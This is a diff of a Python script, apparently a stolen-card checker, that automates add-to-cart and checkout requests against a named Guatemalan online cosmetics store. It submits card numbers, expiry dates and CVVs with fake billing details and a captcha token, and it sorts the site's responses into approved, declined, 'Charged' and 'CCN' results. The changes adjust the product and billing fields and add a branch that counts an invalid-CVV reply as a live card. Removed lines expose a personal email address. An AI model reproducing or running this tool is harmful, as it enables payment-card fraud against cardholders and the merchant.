@@ -68,13 +68,13 @@ def addcart():
         "ywgc_has_custom_design": (None, "1"),
         "ywgc-is-digital": (None, "1"),
         "gift_amounts": (None, "100"),
-        "ywgc-recipient-name[]": (None, "Meli"),
-        "ywgc-recipient-email[]": (None, "meli34q@gmail.com"),
+        "ywgc-recipient-name[]": (None, nombre),
+        "ywgc-recipient-email[]": (None, correo),
         "ywgc-edit-message": (None, "hola"),
         "ywgc-sender-name": (None, "jimena"),
         "quantity": (None, "1"),
-        "add-to-cart": (None, "8754"),
-        "product_id": (None, "8754"),
+        "add-to-cart": (None, "46281"),
+        "product_id": (None, "46281"),
     }
 
     headers = {
@@ -82,7 +82,7 @@ def addcart():
         'Accept-Language': 'es-ES,es;q=0.9',
         'Connection': 'keep-alive',
         'Origin': 'https://beautydepot.com.gt',
-        'Referer': 'https://beautydepot.com.gt/producto/gift-card-q100/',
+        'Referer': 'https://beautydepot.com.gt/producto/ecotools-fresh-perfecting-blender/',
         'Sec-Fetch-Dest': 'empty',
         'Sec-Fetch-Mode': 'cors',
         'Sec-Fetch-Site': 'same-origin',
@@ -137,7 +137,7 @@ def checkout(tokencap,nonce,ccnumber,mes,ano,cvv):
     'sec-ch-ua-platform': '"Windows"',
     }
 
-    data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fbeautydepot.com.gt%2Fcarro-de-compras%2F&wc_order_attribution_session_start_time={session_start}&wc_order_attribution_session_pages={session_pages}&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F148.0.0.0+Safari%2F537.36&billing_first_name={nombre}&billing_last_name={apellido}&billing_nit={nit}&billing_company=&billing_country=US&billing_address_1=75+Street+Road&billing_address_2=&billing_city=Warminster&billing_state=PA&billing_postcode=18974&billing_phone=16165663325&billing_email={correo}&billing_birthday=2000-12-25&order_comments=&coupon_code=&g-recaptcha-response={tokencap}&payment_method=cybs&cybs-card-number={ccnumber}&cybs-card-expiry={mes}+%2F+{ano}&cybs-card-cvc={cvv}&cybs-card-name=Mario+Ruiz&terms=on&terms-field=1&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
+    data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fbeautydepot.com.gt%2Fcarro-de-compras%2F&wc_order_attribution_session_start_time={session_start}&wc_order_attribution_session_pages={session_pages}&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F148.0.0.0+Safari%2F537.36&billing_first_name={nombre}&billing_last_name={apellido}&billing_nit={nit}&billing_company=&billing_country=GT&billing_address_1=75+Street+Road&billing_address_2=&billing_city=Warminster&billing_state=GT-CM&billing_postcode=18974&billing_phone=161456355087&billing_email={correo}&billing_birthday=2000-12-25&order_comments=&coupon_code=&g-recaptcha-response={tokencap}&payment_method=cybs&cybs-card-number={ccnumber}&cybs-card-expiry={mes}+%2F+{ano}&cybs-card-cvc={cvv}&cybs-card-name=Mario+Ruiz&terms=on&terms-field=1&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
 
     import re
     
@@ -152,14 +152,18 @@ def checkout(tokencap,nonce,ccnumber,mes,ano,cvv):
         mensajes = "Rechazada"
         print("Charged")
         return mensajes
+    if "CVV no valido" in mensaje:
+        mensajes = "Aprovada"
+        print("CCN")
+        return mensajes
     if "success" in mensaje:
         mensajes = "Aprovada"
         print("Charged")
         return mensajes
-    if " " in mensaje:
+    if not mensaje:
         mensajes = "Aprovada"
+        print("Charged")
         return mensajes
-    
     return mensaje
 
 
